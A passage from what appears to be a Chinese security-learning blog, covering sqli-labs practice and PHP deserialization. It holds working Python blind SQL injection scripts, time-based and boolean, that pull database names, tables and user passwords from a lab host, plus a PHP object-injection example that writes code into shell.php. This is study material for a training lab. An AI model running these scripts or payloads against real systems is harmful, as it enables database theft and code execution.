<h1 id="延时注入-GET"><a href="#延时注入-GET" class="headerlink" title="延时注入(GET)"></a>延时注入(GET)</h1><h2 id="判断数据库长度"><a href="#判断数据库长度" class="headerlink" title="判断数据库长度"></a>判断数据库长度</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://116.62.104.172:81/Less-8/"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">timeout</span><span class="params">(url)</span>:</span>     <span class="comment">#定义一个延时函数</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        res=requests.get(url,timeout=<span class="number">2</span>)</span><br><span class="line">        <span class="keyword">return</span> res.text                 <span class="comment">#如果没超时返回HTML页面</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> a:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"timeout"</span>            <span class="comment">#如果超时返回timeout</span></span><br><span class="line"></span><br><span class="line">dbName=<span class="number">0</span>        <span class="comment">#初始长度为0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    dbname_url=url+<span class="string">"?id=1' and if(length(database())="</span>+str(dbName)+<span class="string">",sleep(3),9)--+"</span>  <span class="comment">#判断长度是否等于dbName，等于则延时三秒</span></span><br><span class="line"></span><br><span class="line">    print(dbname_url)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">"timeout"</span> <span class="keyword">in</span> timeout(dbname_url):            <span class="comment">#将构造后的url传如入函数中判断是否延时</span></span><br><span class="line">        print(<span class="string">"The db len:"</span>+str(dbName))</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> dbName==<span class="number">30</span>:</span><br><span class="line">        print(<span class="string">"Error!"</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    dbName+=<span class="number">1</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/13/mangzhu-exp/6.png" alt></p>
<h2 id="获取数据库名-1"><a href="#获取数据库名-1" class="headerlink" title="获取数据库名"></a>获取数据库名</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://116.62.104.172:81/Less-8/"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">timeout</span><span class="params">(url)</span>:</span>     <span class="comment">#定义一个延时函数</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        res=requests.get(url,timeout=<span class="number">2</span>)</span><br><span class="line">        <span class="keyword">return</span> res.text                 <span class="comment">#如果没超时返回HTML页面</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> a:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"timeout"</span>            <span class="comment">#如果超时返回timeout</span></span><br><span class="line">data=<span class="string">"qwertyuioplkjhgfdsazxcvbnm_1234567809"</span></span><br><span class="line"><span class="comment">#数据库名</span></span><br><span class="line">dbName=<span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">9</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> data:</span><br><span class="line">        dbname_url=url+<span class="string">"?id=1' and if(substr(database(),"</span>+str(i)+<span class="string">",1)='"</span>+j+<span class="string">"',sleep(3),1)--+"</span></span><br><span class="line">        print(dbname_url)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"timeout"</span> <span class="keyword">in</span> timeout(dbname_url):</span><br><span class="line">            dbName+=j</span><br><span class="line">            print(<span class="string">"The dbName:"</span>+dbName)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/13/mangzhu-exp/7.png" alt></p>
<h2 id="获取表名-1"><a href="#获取表名-1" class="headerlink" title="获取表名"></a>获取表名</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://116.62.104.172:81/Less-8/"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">timeout</span><span class="params">(url)</span>:</span>     <span class="comment">#定义一个延时函数</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        res=requests.get(url,timeout=<span class="number">2</span>)</span><br><span class="line">        <span class="keyword">return</span> res.text                 <span class="comment">#如果没超时返回HTML页面</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> a:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"timeout"</span>            <span class="comment">#如果超时返回timeout</span></span><br><span class="line">data=<span class="string">"qwertyuioplkjhgfdsazxcvbnm_1234567809"</span></span><br><span class="line"><span class="comment">#获取表名</span></span><br><span class="line">TbName=<span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">9</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> data:</span><br><span class="line">        tbname_url=url+<span class="string">"?id=1' and if(substr((select table_name from information_schema.tables where table_schema='security' limit 0,1),"</span>+str(i)+<span class="string">",1)='"</span>+j+<span class="string">"',sleep(3),1)--+"</span></span><br><span class="line">       <span class="comment"># print(tbname_url)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">"timeout"</span> <span class="keyword">in</span> timeout(tbname_url):</span><br><span class="line">            TbName+=j</span><br><span class="line">            print(<span class="string">"The dbName:"</span>+TbName)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/13/mangzhu-exp/8.png" alt></p>
<h2 id="获取列名-1"><a href="#获取列名-1" class="headerlink" title="获取列名"></a>获取列名</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://116.62.104.172:81/Less-8/"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">timeout</span><span class="params">(url)</span>:</span>     <span class="comment">#定义一个延时函数</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        res=requests.get(url,timeout=<span class="number">2</span>)</span><br><span class="line">        <span class="keyword">return</span> res.text                 <span class="comment">#如果没超时返回HTML页面</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> a:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"timeout"</span>            <span class="comment">#如果超时返回timeout</span></span><br><span class="line">data=<span class="string">"qwertyuioplkjhgfdsazxcvbnm_1234567809"</span></span><br><span class="line"><span class="comment">#获取列名</span></span><br><span class="line">TbName=<span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">9</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> data:</span><br><span class="line">        tbname_url=url+<span class="string">"?id=1' and if(substr((select column_name from information_schema.columns where table_name='users' limit 1,1),"</span>+str(i)+<span class="string">",1)='"</span>+j+<span class="string">"',sleep(3),1)--+"</span></span><br><span class="line">       <span class="comment"># print(tbname_url)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">"timeout"</span> <span class="keyword">in</span> timeout(tbname_url):</span><br><span class="line">            TbName+=j</span><br><span class="line">            print(<span class="string">"The coName:"</span>+TbName)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/13/mangzhu-exp/9.png" alt></p>
<h2 id="获取内容-1"><a href="#获取内容-1" class="headerlink" title="获取内容"></a>获取内容</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://116.62.104.172:81/Less-8/"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">timeout</span><span class="params">(url)</span>:</span>     <span class="comment">#定义一个延时函数</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        res=requests.get(url,timeout=<span class="number">2</span>)</span><br><span class="line">        <span class="keyword">return</span> res.text                 <span class="comment">#如果没超时返回HTML页面</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> a:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"timeout"</span>            <span class="comment">#如果超时返回timeout</span></span><br><span class="line">data=<span class="string">"qwertyuioplkjhgfdsazxcvbnm_1234567809"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#获取内容</span></span><br><span class="line">TbName=<span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">9</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> data:</span><br><span class="line">        tbname_url=url+<span class="string">"?id=1' and if(substr((select username from users limit 1,1),"</span>+str(i)+<span class="string">",1)='"</span>+j+<span class="string">"',sleep(3),1)--+"</span></span><br><span class="line">       <span class="comment"># print(tbname_url)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">"timeout"</span> <span class="keyword">in</span> timeout(tbname_url):</span><br><span class="line">            TbName+=j</span><br><span class="line">            print(<span class="string">"The coName:"</span>+TbName)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/13/mangzhu-exp/10.png" alt></p>
<h1 id="布尔盲注-POST"><a href="#布尔盲注-POST" class="headerlink" title="布尔盲注(POST)"></a>布尔盲注(POST)</h1><h2 id="判断数据库长度-1"><a href="#判断数据库长度-1" class="headerlink" title="判断数据库长度"></a>判断数据库长度</h2><p>上周在这里卡了很久，post传参始终传不上去。今天又测试了一下，发现while true下面没有url，并且payload不能使用and，要使用or。。。。不过好在成功了，后面便轻松了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">"http://116.62.104.172:81/Less-16/"</span></span><br><span class="line">data=&#123;</span><br><span class="line">        <span class="string">"uname"</span>:<span class="string">"Dumb"</span>,</span><br><span class="line">        <span class="string">"passwd"</span>:<span class="string">'1") or 1=1#'</span>,</span><br><span class="line">        &#125;</span><br><span class="line">normallen=len(requests.post(url=url,data=data).text)<span class="comment">#获取正常回显时网页的长度</span></span><br><span class="line">print(normallen)</span><br><span class="line">dblen=<span class="number">0</span>    <span class="comment">#设置初始长度为0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    url = <span class="string">"http://116.62.104.172:81/Less-16/"</span></span><br><span class="line">    payload=<span class="string">'1") or length(database())='</span>+str(dblen)+<span class="string">'#'</span></span><br><span class="line">    data1=&#123;</span><br><span class="line">                <span class="string">"uname"</span>:<span class="string">"Dumb"</span>,</span><br><span class="line">                <span class="string">"passwd"</span>:payload,</span><br><span class="line">            &#125;</span><br><span class="line">    print(data1)</span><br><span class="line">    print(len(requests.post(url=url,data=data1).text))</span><br><span class="line">    <span class="keyword">if</span> len(requests.post(url=url,data=data1).text)==normallen:    <span class="comment">#判断长度是否等于正常时页面长度</span></span><br><span class="line">        print(<span class="string">"The Len Of Dblen:"</span>+str(dblen))</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> dblen==<span class="number">30</span>:</span><br><span class="line">        print(<span class="string">"Error!"</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    dblen+=<span class="number">1</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/13/mangzhu-exp/11.png" alt></p>
<h2 id="获取数据库名-2"><a href="#获取数据库名-2" class="headerlink" title="获取数据库名"></a>获取数据库名</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">"http://116.62.104.172:81/Less-16/"</span></span><br><span class="line">data = &#123;</span><br><span class="line">        <span class="string">"uname"</span>:<span class="string">"asd"</span>,</span><br><span class="line">        <span class="string">"passwd"</span>:<span class="string">'1") or 1=1#'</span></span><br><span class="line">        &#125;</span><br><span class="line">normallen = len(requests.post(url=url,data=data).text)</span><br><span class="line">print(normallen)</span><br><span class="line">database_name=<span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">30</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">32</span>,<span class="number">128</span>):</span><br><span class="line">                payload = <span class="string">'1") or ascii(substr(database(),'</span>+str(i)+<span class="string">',1))='</span>+str(j)+<span class="string">'#'</span></span><br><span class="line">                data3 = &#123;</span><br><span class="line">                        <span class="string">"uname"</span>:<span class="string">"asd"</span>,</span><br><span class="line">                        <span class="string">"passwd"</span>:payload</span><br><span class="line">                        &#125;</span><br><span class="line">                finallen=len(requests.post(url=url,data=data3).text)</span><br><span class="line">                <span class="keyword">if</span> finallen==normallen:</span><br><span class="line">                        database_name+=chr(j)</span><br><span class="line">                        print(database_name)</span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/13/mangzhu-exp/12.png" alt></p>
<h2 id="获取表名-2"><a href="#获取表名-2" class="headerlink" title="获取表名"></a>获取表名</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">"http://116.62.104.172:81/Less-16/"</span></span><br><span class="line">data = &#123;</span><br><span class="line">        <span class="string">"uname"</span>:<span class="string">"asd"</span>,</span><br><span class="line">        <span class="string">"passwd"</span>:<span class="string">'1") or 1=1#'</span></span><br><span class="line">        &#125;</span><br><span class="line">normallen = len(requests.post(url=url,data=data).text)</span><br><span class="line">print(normallen)</span><br><span class="line">database_name=<span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">30</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">32</span>,<span class="number">128</span>):</span><br><span class="line">                payload = <span class="string">'1") or ascii(substr((select table_name from information_schema.tables where table_schema="security" limit 0,1),'</span>+str(i)+<span class="string">',1))='</span>+str(j)+<span class="string">'#'</span></span><br><span class="line">                data3 = &#123;</span><br><span class="line">                        <span class="string">"uname"</span>:<span class="string">"asd"</span>,</span><br><span class="line">                        <span class="string">"passwd"</span>:payload</span><br><span class="line">                        &#125;</span><br><span class="line">                finallen=len(requests.post(url=url,data=data3).text)</span><br><span class="line">                <span class="keyword">if</span> finallen==normallen:</span><br><span class="line">                        database_name+=chr(j)</span><br><span class="line">                        print(database_name)</span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/13/mangzhu-exp/13.png" alt></p>
<h2 id="获取列名-2"><a href="#获取列名-2" class="headerlink" title="获取列名"></a>获取列名</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">"http://116.62.104.172:81/Less-16/"</span></span><br><span class="line">data = &#123;</span><br><span class="line">        <span class="string">"uname"</span>:<span class="string">"asd"</span>,</span><br><span class="line">        <span class="string">"passwd"</span>:<span class="string">'1") or 1=1#'</span></span><br><span class="line">        &#125;</span><br><span class="line">normallen = len(requests.post(url=url,data=data).text)</span><br><span class="line">print(normallen)</span><br><span class="line">database_name=<span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">30</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">32</span>,<span class="number">128</span>):</span><br><span class="line">                payload = <span class="string">'1") or ascii(substr((select column_name from information_schema.columns where table_name="users" limit 0,1),'</span>+str(i)+<span class="string">',1))='</span>+str(j)+<span class="string">'#'</span></span><br><span class="line">                data3 = &#123;</span><br><span class="line">                        <span class="string">"uname"</span>:<span class="string">"asd"</span>,</span><br><span class="line">                        <span class="string">"passwd"</span>:payload</span><br><span class="line">                        &#125;</span><br><span class="line">                finallen=len(requests.post(url=url,data=data3).text)</span><br><span class="line">                <span class="keyword">if</span> finallen==normallen:</span><br><span class="line">                        database_name+=chr(j)</span><br><span class="line">                        print(database_name)</span><br></pre></td></tr></table></figure>

<h2 id="获取数据"><a href="#获取数据" class="headerlink" title="获取数据"></a>获取数据</h2><figure class="highlight xl"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">"http://116.62.104.172:81/Less-16/"</span></span><br><span class="line"><span class="keyword">data</span> = &#123;</span><br><span class="line">        <span class="string">"uname"</span>:<span class="string">"asd"</span>,</span><br><span class="line">        <span class="string">"passwd"</span>:<span class="string">'1") or 1=1#'</span></span><br><span class="line">        &#125;</span><br><span class="line">normallen = len(requests.post(url=url,<span class="keyword">data</span>=<span class="keyword">data</span>).<span class="keyword">text</span>)</span><br><span class="line">print(normallen)</span><br><span class="line">database_name=<span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="built_in">in</span> range(<span class="number">1</span>,<span class="number">30</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="built_in">in</span> range(<span class="number">32</span>,<span class="number">128</span>):</span><br><span class="line">                payload = <span class="string">'1") or ascii(substr((select password from users limit 0,1),'</span>+str(i)+<span class="string">',1))='</span>+str(j)+<span class="string">'#'</span></span><br><span class="line">                data3 = &#123;</span><br><span class="line">                        <span class="string">"uname"</span>:<span class="string">"asd"</span>,</span><br><span class="line">                        <span class="string">"passwd"</span>:payload</span><br><span class="line">                        &#125;</span><br><span class="line">                finallen=len(requests.post(url=url,<span class="keyword">data</span>=data3).<span class="keyword">text</span>)</span><br><span class="line">                <span class="keyword">if</span> finallen==normallen:</span><br><span class="line">                        database_name+=chr(j)</span><br><span class="line">                        print(database_name)</span><br></pre></td></tr></table></figure>

<p><img src="/2020/03/13/mangzhu-exp/14.png" alt></p>
<h1 id="延时注入-POST"><a href="#延时注入-POST" class="headerlink" title="延时注入(POST)"></a>延时注入(POST)</h1><h2 id="直接获取数据"><a href="#直接获取数据" class="headerlink" title="直接获取数据"></a>直接获取数据</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time 	</span><br><span class="line">result = <span class="string">""</span></span><br><span class="line">url=<span class="string">'http://116.62.104.172:81/Less-16/'</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">60</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">32</span>,<span class="number">128</span>):</span><br><span class="line">        ss = time.time()		<span class="comment">#获取当前时间戳</span></span><br><span class="line">        payload = <span class="string">'1") or if(ascii(substr((select password from users limit 0,1),'</span>+str(i)+<span class="string">',1))='</span>+str(j)+<span class="string">',sleep(0.1),2)#'</span></span><br><span class="line">        data = &#123;</span><br><span class="line">                        <span class="string">"uname"</span>:<span class="string">"asd"</span>,</span><br><span class="line">                        <span class="string">"passwd"</span>:payload</span><br><span class="line">                        &#125;</span><br><span class="line">        r = requests.post(url=url,data=data)</span><br><span class="line">        <span class="keyword">if</span> time.time() - ss&gt;=<span class="number">0.5</span>:</span><br><span class="line">            x = chr(j)</span><br><span class="line">            result+=str(x)</span><br><span class="line">            print(result)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<p>其他的基本都差不多，只一个方法是根据获取时间戳的差来判断是否回显成功，而前几天写的是根据timeout来判断，原理都差不多。</p>
]]></content>
      <tags>
        <tag>python学习</tag>
      </tags>
  </entry>
  <entry>
    <title>php反序列化漏洞学习</title>
    <url>/2020/04/02/php-unserialize/</url>
    <content><![CDATA[<p>以前也了解过反序列化漏洞，但是其原理和利用方式基本都没有怎么深入。刚好最近打CTF又碰到了一些反序列化的题，所以决定从头再来学一下。(ಥ_ಥ) <a id="more"></a></p>
<h1 id="序列化与反序列化"><a href="#序列化与反序列化" class="headerlink" title="序列化与反序列化"></a>序列化与反序列化</h1><h2 id="serialize"><a href="#serialize" class="headerlink" title="serialize"></a>serialize</h2><p>当在php中创建了一个对象后，可以通过serialize()把这个对象转变成一个字符串，保存对象的值方便之后的传递与使用.</p>
<blockquote>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CyzCc</span></span>&#123;</span><br><span class="line">	<span class="keyword">var</span> $test = <span class="string">'123'</span>;</span><br><span class="line">&#125;</span><br><span class="line">$class1 = <span class="keyword">new</span> CyzCc;</span><br><span class="line">$class1_ser = serialize($class1);</span><br><span class="line">print_r($class1_ser);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
</blockquote>
<p>我们创建了一个新的对象,其反序列化后的结果为</p>
<blockquote>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">O</span><span class="selector-pseudo">:5</span><span class="selector-pseudo">:"CyzCc"</span><span class="selector-pseudo">:1</span>:&#123;<span class="attribute">s</span>:<span class="number">4</span>:<span class="string">"test"</span>;<span class="attribute">s</span>:<span class="number">3</span>:<span class="string">"123"</span>;&#125;</span><br></pre></td></tr></table></figure>
</blockquote>
<p>这里的<code>O</code>代表存储的是对象（object）,假如你给serialize()传入的是一个数组，那它会变成字母a。<code>7</code>表示对象的名称有7个字符。<code>&quot;CyzCc``&quot;</code>表示对象的名称。<code>1</code>表示有一个值。<code>{s:4:&quot;test&quot;;s:3:&quot;123&quot;;}</code>中，<code>s</code>表示字符串，<code>4</code>表示该字符串的长度，<code>&quot;test&quot;</code>为字符串的名称，之后的类似。</p>
<h2 id="unserialize"><a href="#unserialize" class="headerlink" title="unserialize"></a>unserialize</h2><blockquote>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CyzCc</span></span>&#123;</span><br><span class="line">	<span class="keyword">var</span> $test = <span class="string">'123'</span>;</span><br><span class="line">&#125;</span><br><span class="line">$class1 = <span class="string">'O:5:"CyzCc":1:&#123;s:4:"test";s:3:"123";&#125;'</span>;</span><br><span class="line"><span class="keyword">echo</span> $class1;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"></span><br><span class="line">$class1_ser=unserialize($class1);</span><br><span class="line">print_r($class1_ser);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
</blockquote>
<p><img src="/2020/04/02/php-unserialize/1.png" alt></p>
<blockquote>
<figure class="highlight less"><table><tr><td class="code"><pre><span class="line"><span class="attribute">O</span>:<span class="number">5</span>:<span class="string">"CyzCc"</span>:<span class="number">1</span>:&#123;<span class="attribute">s</span>:<span class="number">4</span>:<span class="string">"test"</span>;<span class="attribute">s</span>:<span class="number">3</span>:<span class="string">"123"</span>;&#125;</span><br><span class="line"><span class="selector-tag">CyzCc</span> <span class="selector-tag">Object</span> ( [test] =&gt; <span class="number">123</span> )</span><br></pre></td></tr></table></figure>
</blockquote>
<p>当我们使用 unserialize() 恢复对象时， 将调用 __wakeup() 成员函数</p>
<h1 id="反序列化漏洞"><a href="#反序列化漏洞" class="headerlink" title="反序列化漏洞"></a>反序列化漏洞</h1><h2 id="魔术方法"><a href="#魔术方法" class="headerlink" title="魔术方法"></a>魔术方法</h2><p>php中有一类特殊的方法叫“<a href="https://secure.php.net/manual/zh/language.oop5.magic.php" target="_blank" rel="noopener">Magic function</a>”， 这里我们着重关注一下几个：</p>
<ul>
<li>构造函数__construct()：当对象创建(new)时会自动调用。但在unserialize()时是不会自动调用的。</li>
<li>析构函数__destruct()：当对象被销毁时会自动调用。</li>
<li>__wakeup() ：如前所提，unserialize()时会自动调用。</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CyzCc</span></span>&#123;</span><br><span class="line">	<span class="keyword">var</span> $test = <span class="string">'123'</span>;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"__wakeup"</span>;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"__construct"</span>;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"&lt;/br&gt;"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"__destruct"</span>;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;		</span><br><span class="line">$class1 = <span class="string">'O:5:"CyzCc":1:&#123;s:4:"test";s:3:"123";&#125;'</span>;</span><br><span class="line"><span class="keyword">echo</span> $class1;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">$class1_ser=unserialize($class1);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">print_r($class1_ser);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/04/02/php-unserialize/2.png" alt></p>
<h2 id="简单利用"><a href="#简单利用" class="headerlink" title="简单利用"></a>简单利用</h2><p>__wakeup() 或__destruct()</p>
<p>unserialize()后会导致__wakeup() 或__destruct()的直接调用，中间无需其他过程。因此最理想的情况就是一些漏洞/危害代码在__wakeup() 或__destruct()中，从而当我们控制序列化字符串时可以去直接触发它们。这里针对 __wakeup() 场景做个实验。假设index源码如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CyzCc</span></span>&#123;</span><br><span class="line">	<span class="keyword">var</span> $test = <span class="string">'123'</span>;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line">		$fp=fopen(<span class="string">"shell.php"</span>,<span class="string">"w"</span>);</span><br><span class="line">		fwrite($fp,<span class="keyword">$this</span>-&gt;test);</span><br><span class="line">		fclose($fp);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">$class=$_GET[<span class="string">'test'</span>];</span><br><span class="line"><span class="keyword">echo</span> $class;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">$class_unser=unserialize($class);</span><br><span class="line"><span class="keyword">require</span> <span class="string">"shell.php"</span>;<span class="comment">//包含shell.php文件</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>基本的思路是，通过 serialize() 得到我们要的序列化字符串，之后再传进去。通过源代码知，把对象中的test值赋为 “&lt;?php phpinfo(); ?&gt;”,再调用unserialize()时会通过__wakeup()把test的写入到shell.php中。为此我们写个php脚本：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CyzCc</span></span>&#123;</span><br><span class="line">	<span class="keyword">var</span> $test = <span class="string">'123'</span>;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line">		$fp=fopen(<span class="string">"shell.php"</span>,<span class="string">"w"</span>);</span><br><span class="line">		fwrite($fp,<span class="keyword">$this</span>-&gt;test);</span><br><span class="line">		fclose($fp);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">$class2=<span class="keyword">new</span> CyzCc();</span><br><span class="line">$class2-&gt;test=<span class="string">"&lt;?php phpinfo();?&gt;"</span>;</span><br><span class="line">$class2_ser=serialize($class2);</span><br><span class="line"><span class="keyword">echo</span> $class2_ser;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>O:5:”CyzCc”:1:{s:4:”test”;s:18:”&lt;?php phpinfo();?&gt;”;}</p>
</blockquote>
<p><img src="/2020/04/02/php-unserialize/3.png" alt><br>当我们传入的时候便出发了__wakeup()将内容写入了shell.php中。</p>
<p>__construct()</p>
<p>有时候反序列化一个对象时，由它调用的__wakeup()中又去调用了其他的对象，由此可以溯源而上，利用一次次的“gadget”找到漏洞点</p>
